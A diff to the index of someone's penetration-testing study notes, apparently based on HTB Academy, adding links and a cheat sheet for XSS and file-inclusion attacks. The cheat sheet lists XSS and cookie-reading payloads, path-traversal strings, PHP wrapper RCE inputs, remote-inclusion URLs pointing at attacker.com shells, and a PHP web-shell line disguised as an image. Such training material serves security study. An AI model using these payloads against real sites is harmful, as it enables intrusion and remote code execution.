@@ -14,6 +14,19 @@
 * [🔧 Web Application Enumeration](web-enumeration/web-application-enumeration.md)
 * [📋 Web Information Gathering Overview](web-enumeration/web-information-gathering.md)
 
+### 🌐 Web Application Attacks
+* [🔥 Cross-Site Scripting (XSS)](xss-cross-site-scripting.md)
+* [📁 File Inclusion](file-inclusion/README.md)
+  * [Basic LFI Techniques](file-inclusion/basic-lfi-techniques.md)
+  * [Advanced Bypasses & PHP Filters](file-inclusion/advanced-bypasses-filters.md)
+  * [PHP Wrappers for RCE](file-inclusion/php-wrappers-rce.md)
+  * [Remote File Inclusion (RFI)](file-inclusion/remote-file-inclusion.md)
+  * [File Upload + LFI](file-inclusion/file-upload-lfi.md)
+  * [Log Poisoning Techniques](file-inclusion/log-poisoning-techniques.md)
+  * [Automated Scanning & Tools](file-inclusion/automated-scanning-tools.md)
+  * [Prevention & Hardening](file-inclusion/prevention-hardening.md)
+  * [Skills Assessment Walkthrough](file-inclusion/skills-assessment-walkthrough.md)
+
 
 ### 🗄️ Database Services
 * [🔍 MySQL Enumeration](databases/mysql-enumeration.md)
@@ -169,6 +182,32 @@
 * **CMS Tools** - wpscan, joomscan, droopescan for specific platforms
 * **Parameter Discovery** - arjun, paramspider, ffuf for hidden parameters
 
+### 🌐 Web Application Attacks
+* **XSS Types** - Stored (persistent), Reflected (non-persistent), DOM-based (client-side)
+* **XSS Tools** - XSStrike, BruteXSS, Burp Suite, OWASP ZAP
+* **Basic Payloads** - `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
+* **Cookie Stealing** - `<script>alert(document.cookie)</script>`
+* **LFI Techniques** - Path Traversal (`../../../etc/passwd`), PHP Wrappers (`php://filter`)
+* **LFI Bypasses** - Non-recursive (`....//`), URL encoding (`%2e%2e%2f`), Approved paths (`./languages/../../../`)
+* **PHP Filters** - Source code disclosure (`php://filter/read=convert.base64-encode/resource=config`)
+* **PHP Fuzzing** - `ffuf -u http://target.com/FUZZ.php`, common files (`config.php`, `database.php`)
+* **PHP Wrappers RCE** - Data (`data://text/plain;base64,BASE64`), Input (`php://input` + POST), Expect (`expect://id`)
+* **RCE Requirements** - `allow_url_include = On` (data/input), `expect` extension (expect wrapper)
+* **Remote File Inclusion (RFI)** - HTTP (`http://attacker.com/shell.php`), FTP (`ftp://attacker.com/shell.php`), SMB (`\\attacker.com\share\shell.php`)
+* **RFI Servers** - Python HTTP (`python3 -m http.server 80`), FTP (`python3 -m pyftpdlib -p 21`), SMB (`impacket-smbserver`)
+* **File Upload + LFI** - Malicious images (`GIF8<?php system($_GET["cmd"]); ?>`), Zip (`zip://file.jpg#shell.php`), Phar (`phar://file.jpg/shell.txt`)
+* **Upload Paths** - `/uploads/`, `/profile_images/`, `/assets/images/`, path discovery via source inspection
+* **Log Poisoning** - Session (`/var/lib/php/sessions/sess_ID`), Apache (`/var/log/apache2/access.log` + User-Agent), SSH (`/var/log/auth.log`)
+* **Process Poisoning** - `/proc/self/environ`, `/proc/self/fd/N` via User-Agent header injection
+* **Automated Scanning** - Parameter fuzzing (`ffuf` + `burp-parameter-names.txt`), LFI wordlists (`LFI-Jhaddix.txt`), Server discovery
+* **LFI Tools** - `liffy`, `LFISuite`, `dotdotpwn`, `kadimus`, custom automation scripts
+* **File Inclusion Module** - 9 specialized guides: Basic LFI → Advanced Bypasses → PHP Wrappers → RFI → File Upload → Log Poisoning → Automated Tools → Prevention → Skills Assessment
+* **LFI Techniques** - Path traversal, PHP filters (`base64-encode`), Wrapper RCE (`data://`, `php://input`, `expect://`)
+* **RFI Protocols** - HTTP, FTP, SMB remote file inclusion for direct RCE
+* **Log Poisoning** - Session, Apache, SSH, Mail, FTP log contamination for RCE
+* **PHP Security** - `disable_functions`, `open_basedir`, `allow_url_include=Off`, Container isolation
+* **Skills Assessment** - Multi-technique chain: PHP filters → Hidden admin → LFI → Log poisoning → RCE → Flag extraction
+
 ### 🔧 Database Enumeration
 * **MySQL** - Port 3306, default credentials, SQL injection
 * **MSSQL** - Port 1433, Windows authentication, xp_cmdshell
@@ -199,15 +238,20 @@
 * Host-Based Enumeration
 * Web Application Information Gathering
 * **Attacking Common Services** (Complete - 7 documents, 4,262 lines)
+* **Cross-Site Scripting (XSS)** (Complete - HTB Academy guide with all XSS types and techniques)
+* **File Inclusion** (Complete - HTB Academy module with 9 specialized guides: Basic LFI, Advanced Bypasses, PHP Wrappers RCE, RFI, File Upload + LFI, Log Poisoning, Automated Scanning, Prevention & Hardening, Skills Assessment)
 
 ### 🔄 In Progress
 * Vulnerability Assessment
-* Web Application Attacks
 * Password Attacks
+* Command Injection
 
 ### 📅 Planned
+* SQL Injection (Advanced)
+* File Inclusion & Directory Traversal
+* Command Injection
+* File Upload Attacks
 * Network Enumeration
-* Active Directory Enumeration & Attacks
 * Privilege Escalation
 * Lateral Movement
 * Post-Exploitation 
